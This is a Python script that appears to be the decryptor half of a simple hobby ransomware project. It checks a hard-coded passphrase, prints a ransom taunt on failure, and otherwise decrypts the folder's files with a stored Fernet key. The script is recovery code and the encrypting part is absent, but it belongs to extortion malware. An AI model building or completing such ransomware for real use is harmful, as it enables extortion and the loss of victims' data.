#!/usr/bin/env  python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if (file == "virus.py" or file == "encryptedKey.key" or file == "decrypt.py"):
        continue
    if os.path.isfile(file):
        files.append(file)


# Create variable secrete pharse and store the value
secretPhrase = "hello"

# Ask user to enter the valid pharse to decrypt the files
enteredPhrase = input("Enter valid phrase to decrypt the files\n")

# Write condition to match the pharse
if (secretPhrase != enteredPhrase):
    print(" 👹👹👹👹 Invalid Phrase try one more time or Pay me more 👹👹👹👹 ")
else:
    # Read the encryptedKey.key file
    with open("encryptedKey.key", "rb") as encryptedKey:
        secretKey = encryptedKey.read()

    # Iterate the loop over the files list
    for file in files:
        # Read and decrypt the file data
        with open(file, "rb") as theFile:
            rawData = theFile.read()
        decryptedRawData = Fernet(secretKey).decrypt(rawData)

        # Update the same file with decrypted data
        with open(file, "wb") as theFile:
            theFile.write(decryptedRawData)

    # Notify the message to the user
    print("You have successfully recovered all the files!!")
